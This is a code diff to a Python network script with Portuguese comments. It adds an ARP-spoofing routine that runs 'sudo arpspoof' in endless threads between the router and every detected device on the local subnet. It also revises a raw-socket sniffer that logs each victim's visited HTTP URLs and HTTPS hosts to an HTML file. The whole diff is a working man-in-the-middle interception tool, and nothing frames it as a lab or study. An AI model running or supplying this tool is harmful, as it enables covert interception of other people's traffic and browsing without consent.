@@ -26,6 +26,38 @@ def verificar_host(ip):
         print(f"[!] Erro ao verificar host {ip}: {erro}")
         return False
 
+def executar_arp_spoof(interface, dispositivos, ip_local):
+    """
+    Realiza ARP Spoofing para os dispositivos detectados na rede.
+    Cria threads para enviar pacotes de ARP entre o roteador e os dispositivos ativos.
+    """
+    ip_roteador = f"{'.'.join(ip_local.split('.')[:3])}.1"
+    print(f"[*] Iniciando ARP Spoofing apenas para dispositivos ativos na rede...")
+
+    def spoof_loop(ip_origem, ip_destino):
+        """Executa o comando arpspoof indefinidamente."""
+        comando = f"sudo arpspoof -i {interface} -t {ip_origem} {ip_destino}"
+        while True:
+            os.system(f"{comando} > /dev/null 2>&1")
+
+    threads = []
+    for ip_alvo in dispositivos:
+        if ip_alvo == ip_local or ip_alvo == ip_roteador:
+            continue
+
+        # Enviar spoofing do roteador para o dispositivo
+        t1 = threading.Thread(target=spoof_loop, args=(ip_roteador, ip_alvo))
+        t1.start()
+        threads.append(t1)
+
+        # Enviar spoofing do dispositivo para o roteador
+        t2 = threading.Thread(target=spoof_loop, args=(ip_alvo, ip_roteador))
+        t2.start()
+        threads.append(t2)
+
+    # Threads executam indefinidamente
+    return threads
+
 
 def escanear_dispositivos(ip_local, max_threads=50):
     """Realiza a varredura de dispositivos ativos na sub-rede."""
@@ -65,7 +97,7 @@ def escanear_dispositivos(ip_local, max_threads=50):
 
 
 def capturar_pacotes(interface, html_file):
-    """Captura pacotes HTTP (porta 80) e HTTPS (porta 443) e salva informações separadas em um arquivo HTML."""
+    """Captura pacotes HTTP (porta 80) e HTTPS (porta 443) e salva informações em um arquivo HTML."""
     try:
         raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
         raw_socket.bind((interface, 0))
@@ -83,27 +115,30 @@ def capturar_pacotes(interface, html_file):
 
         while True:
             try:
-                pacote, _ = raw_socket.recvfrom(65565)
+                pacote, _ = raw_socket.recvfrom(65535)
 
+                # Cabeçalho Ethernet
                 eth_header = pacote[:14]
                 eth_data = struct.unpack("!6s6sH", eth_header)
 
                 if socket.ntohs(eth_data[2]) != 0x0800:  # Não é IPv4
                     continue
 
+                # Cabeçalho IP
                 ip_header = pacote[14:34]
                 ip_data = struct.unpack("!BBHHHBBH4s4s", ip_header)
                 protocolo = ip_data[6]
                 ip_origem = socket.inet_ntoa(ip_data[8])
 
                 if protocolo == 6:  # TCP
+                    # Cabeçalho TCP
                     tcp_start = 34
                     tcp_header = pacote[tcp_start:tcp_start + 20]
                     tcp_data = struct.unpack("!HHLLBBHHH", tcp_header)
                     porta_origem = tcp_data[0]
                     porta_destino = tcp_data[1]
 
-                    # Separar pacotes HTTP (porta 80) e HTTPS (porta 443)
+                    # Filtrar pacotes HTTP (porta 80) e HTTPS (porta 443)
                     if porta_destino == 80 or porta_origem == 80:
                         payload_start = tcp_start + ((tcp_data[4] >> 4) * 4)
                         payload = pacote[payload_start:]
@@ -132,26 +167,35 @@ def capturar_pacotes(interface, html_file):
                                     print(f"[HTTP] {ip_origem} -> {url_completa}")
 
                         except UnicodeDecodeError:
+                            print("[!] Erro de decodificação no pacote HTTP.")
                             continue
 
                     elif porta_destino == 443 or porta_origem == 443:
                         contador_https += 1
                         print(f"[*] HTTPS capturado: {contador_https} pacotes")
 
-                        # Não é possível capturar o conteúdo devido à criptografia, mas registramos o domínio
-                        linhas = payload_start.decode("utf-8", errors="replace").split("\r\n")
-                        host = None
-                        for linha in linhas:
-                            if linha.lower().startswith("host:"):
-                                host = linha.split(":")[1].strip()
-                                break
+                        # HTTPS: registrar apenas o domínio devido à criptografia
+                        payload_start = tcp_start + ((tcp_data[4] >> 4) * 4)
+                        payload = pacote[payload_start:]
 
-                        if host:
-                            url_completa = f"https://{host}"
-                            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                            with open(html_file, "a") as html:
-                                html.write(f"<li>{timestamp} - {ip_origem} - <a href='{url_completa}'>{url_completa}</a></li>\n")
-                            print(f"[HTTPS] {ip_origem} -> {url_completa}")
+                        try:
+                            linhas = payload.decode("utf-8", errors="replace").split("\r\n")
+                            host = None
+                            for linha in linhas:
+                                if linha.lower().startswith("host:"):
+                                    host = linha.split(":")[1].strip()
+                                    break
+
+                            if host:
+                                url_completa = f"https://{host}"
+                                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                                with open(html_file, "a") as html:
+                                    html.write(f"<li>{timestamp} - {ip_origem} - <a href='{url_completa}'>{url_completa}</a></li>\n")
+                                print(f"[HTTPS] {ip_origem} -> {url_completa}")
+
+                        except UnicodeDecodeError:
+                            print("[!] Erro de decodificação no pacote HTTPS.")
+                            continue
 
             except socket.timeout:
                 continue
